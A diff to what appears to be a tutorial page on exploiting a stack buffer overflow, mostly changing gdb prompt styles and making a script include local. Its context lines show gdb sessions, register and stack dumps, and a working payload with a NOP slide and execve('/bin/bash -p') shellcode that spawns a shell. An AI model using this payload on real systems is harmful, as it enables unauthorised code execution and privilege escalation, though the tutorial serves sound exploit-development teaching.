@@ -67,7 +67,7 @@ So, let us start with this:
 __gdb ./vulnerable__
 
 ```bash
-(gdb) disassemble main
+gdb$ disassemble main
 Dump of assembler code for function main:
    0x08048414 <+0>:	push   %ebp
    0x08048415 <+1>:	mov    %esp,%ebp
@@ -111,9 +111,9 @@ So, with the command __disas main__ (short for disassemble main), we can see the
 If you want to run the program:
 
 ```bash
-(gdb) r
+gdb$ r
 Usage: vulnerable <message>
-(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+gdb$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -122,7 +122,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 It is annoying and not handy to inject manually each A char, we will use python instead:
 ```bash
-(gdb) r $(python -c "print 'A' * 40")
+gdb$ r $(python -c "print 'A' * 40")
 Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -133,7 +133,7 @@ This is unexpected on the programmers side, but we read the code and we know tha
 If we didn't read the code because we don't have acces to it, we can still calculate the buffer's size:
 
 ```
-(gdb) i r
+gdb$ i r
 eax            0x0	0x0
 ecx            0x0	0x0
 edx            0x0	0x0
@@ -156,7 +156,7 @@ Here we can see that eip is set to 41414141 and ebp too.
 
 We will print the stack now:
 ```bash
-(gdb) x/20x $esp-40
+gdb$ x/20x $esp-40
 0xbffffc20:	0x08048565	0xbffffc3c	0x08049ff4	0x080484a1
 0xbffffc30:	0xffffffff	0xb7e5ddc6	0xb7fcfff4	0x41414141
 0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -232,7 +232,7 @@ It has no effect on the program but it is useful for us if we dont *precisely* k
 We want to jump in the nop slide, let's take an address in that range: 0xbffffc20
 
 ```
-r $(python -c "print 'A' * 32 + '\x30\xfc\xff\xbf' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
+gdb$ r $(python -c "print 'A' * 32 + '\x30\xfc\xff\xbf' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
 process 6238 is executing new program: /bin/bash
 ```
 
@@ -248,5 +248,5 @@ tiwimH4cked
 
 </xmp>
 
-<script src="http://smzg.github.io/strapdown/example/config/strapdown.js"></script>
+<script src="../strapdown.js"></script>
 </html>
